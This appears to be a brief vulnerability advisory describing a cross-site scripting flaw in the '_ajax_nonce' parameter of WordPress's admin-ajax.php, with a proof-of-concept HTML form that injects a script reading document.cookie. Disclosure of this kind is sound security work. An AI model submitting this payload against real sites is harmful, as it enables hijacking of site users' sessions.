The vulnerability exists due to insufficient filtration of user-supplied data in "_ajax_nonce" HTTP POST parameter in the "/wp-admin/admin-ajax.php" script.

<form action="http://[host]/wp-admin/admin-ajax.php" method="post" name="askform">
<input type="hidden" name="action" value="cl_ajax" />
<input type="hidden" name="do" value="fetch" />
<input type="hidden" name="url" value="1" />
<input type="hidden" name="_ajax_nonce" value='<script>alert(document.cookie);</script>'/>
<input type="submit" id="btn">
</form>
